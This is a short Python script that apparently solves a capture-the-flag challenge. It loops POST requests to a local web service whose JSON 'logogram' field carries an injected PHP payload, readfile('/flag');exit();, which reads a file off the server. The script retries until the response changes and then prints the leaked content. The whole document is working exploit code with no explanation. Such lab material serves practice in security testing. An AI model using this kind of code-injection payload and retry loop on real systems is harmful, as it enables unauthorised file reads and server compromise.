import requests

c = 0

data = '{"signal":"Arrival", "logogram": "readfile(\'/flag\');exit();"}'
while 1:
	c+= 1
	r = requests.post('http://127.0.0.1:8080/?probe=50000', data=data)
	if b'<code>' not in r.content:
		print(r.content)
		print(c)
		exit()